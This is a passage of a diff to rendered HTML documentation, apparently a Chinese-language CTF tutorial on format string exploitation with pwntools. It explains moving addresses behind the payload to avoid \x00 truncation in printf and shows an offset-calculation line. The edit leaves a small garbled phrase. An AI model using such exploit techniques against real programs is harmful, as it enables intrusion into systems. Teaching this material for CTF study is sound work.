 <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
@@ -1220,7 +1224,7 @@ seg000:0000000000400639                 jmp     short loc_4005FE
 <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 </pre></div>
 </div>
-<p>fmtstr_payload直接得到的payload会将地址放在前面，而这个会导致printf的时候’:raw-latex:<a href="#id42"><span class="problematic" id="id43">`</span></a>x`00’截断（<strong>关于这一问题，pwntools目前正在开发fmt_payload的加强版，估计快开发出来了。</strong>）。所以我使用了一些技巧将它放在后面了。主要的思想是，将地址放在后面8字节对齐的地方，并对payload中的偏移进行修改。需要注意的是</p>
+<p>fmtstr_payload直接得到的payload会将地址放在前面，而这个会导致printf的时候\x00’断（<strong>关于这一问题，pwntools目前正在开发fmt_payload的加强版，估计快开发出来了。</strong>）。所以我使用了一些技巧将它放在后面了。主要的思想是，将地址放在后面8字节对齐的地方，并对payload中的偏移进行修改。需要注意的是</p>
 <div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
 </pre></div>
 </div>
